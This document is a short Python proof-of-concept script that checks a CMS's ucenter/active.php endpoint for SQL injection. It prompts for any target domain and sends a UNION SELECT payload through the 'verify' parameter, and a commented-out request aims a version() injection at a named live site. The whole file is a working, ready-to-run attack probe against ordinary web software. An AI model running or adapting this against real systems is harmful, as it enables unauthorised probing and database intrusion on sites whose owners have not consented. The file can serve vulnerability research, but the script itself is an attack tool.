"""
 @Author: UpDown
 @FileName: kcms_sql_poc.py
 @Time: 2022/5/9 11:09
"""
import hashlib
import random

import requests


headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=9qjpg4vanhusg4u8n9eh65tc6h',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
}

# response = requests.get('http://micool.top/ucenter/active.php?verify=1%27%20union%20select%20version()%23', cookies=cookies, headers=headers, verify=False)
# print(response.text)

num1 = str(random.random())
# params = {
#     'verify': "1%27%20union%20select%20version()%23",
# }
md = hashlib.md5()
md.update(num1.encode('utf-8'))
print(md.hexdigest())

try:
    url = input("请输入目标域名[例如：micool.top]：")
    # fin_url = 'http://' + url + 'ucenter/active.php'
    # fin_url = 'http://micool.top/ucenter/active.php'
    # print(fin_url)
    response = requests.get(f'http://{url}/ucenter/active.php?verify=1%27%20union%20select%20md5({num1})%23', headers=headers, verify=False)
    # response = requests.get(fin_url, params=params, headers=headers)
    # print(response.url)
    # print(response.text)
    if md.hexdigest() in response.text:
        print('存在sql注入漏洞' )
except Exception as e:
    pass